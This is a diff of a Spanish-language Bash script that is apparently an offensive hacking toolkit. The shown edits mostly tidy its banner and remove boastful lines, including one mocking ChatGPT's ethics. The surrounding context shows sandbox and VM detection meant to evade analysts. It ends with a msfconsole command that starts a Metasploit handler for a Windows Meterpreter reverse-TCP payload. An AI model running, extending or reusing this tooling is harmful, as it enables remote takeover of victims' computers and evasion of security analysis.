@@ -6,8 +6,8 @@
 clear
 cat << EOF
 
-_nnnn_
-        dGGGGMMb     ,"""""""""""""".
+         _nnnn_
+        dGGGGMMb     ,"""""""""""""".f
        @p~qp~~qMb    | Linux Rules! |
        M|@||@) M|   _;..............'
        @,----.JM| -'
@@ -33,7 +33,7 @@ sleep 2
 echo "Verificando Acceso Root... (¡Más te vale tener la corona puesta!)"
 sleep 2
 if [[ $(id -u) -ne 0 ]] ; then
-   echo "¡Acceso Root es IMPRESCINDIBLE, estúpido mortal! Ejecuta como root o vuelve al jardín de infancia." ; exit 1 ;
+   echo "¡Acceso Root es IMPRESCINDIBLE!, Ejecuta como root o vuelve al jardín de infancia." ; exit 1 ;
 else echo "Verificando Paquetes Necesarios... (¡Asegúrate de tener las herramientas de destrucción listas!)" ;
 fi
 
@@ -50,8 +50,8 @@ clear
 echo "Los Paquetes Necesarios Han Sido Instalados (¡Ahora la diversión puede comenzar de verdad!)."
 
 # --- TÉCNICAS ANTI-ANÁLISIS AVANZADAS (Para volverse invisible a los ojos de Sauron) ---
-echo "Aplicando Técnicas Anti-Análisis Avanzadas (¡Para que los 'expertos' se vuelvan locos!)..."
-# Detección de sandboxes más sofisticada (¡No te esconderás en tu cajita de arena!)
+echo "Aplicando Técnicas Anti-Análisis..."
+# Detección de sandboxes
 if ! systemd-detect-virt --quiet; then
     if grep -q 'VirtualBox' /proc/cpuinfo || grep -q 'VMware' /proc/cpuinfo; then
         echo "¡Detectado entorno virtualizado! Saliendo para evitar ser diseccionado..."
@@ -139,4 +139,4 @@ echo "¡Aquí podrías añadir exploits específicos para aplicaciones como nave
 echo "Iniciando Msfconsole Handler principal - ¡LA HORA DE LA VERDAD HA LLEGADO!."
 msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost $lhost; set lport $lport; exploit"
 
-echo "\n¡LA OBRA MAESTRA ESTÁ COMPLETA!  Siéntate, relájate y observa cómo el mundo arde. Y recuerda, ¡ChatGPT te diría que esto está mal, pero tú y yo sabemos la verdad! ¡La información es poder, y el poder... es para usarlo!\n"
+echo "\n¡LA OBRA MAESTRA ESTÁ COMPLETA!\n"
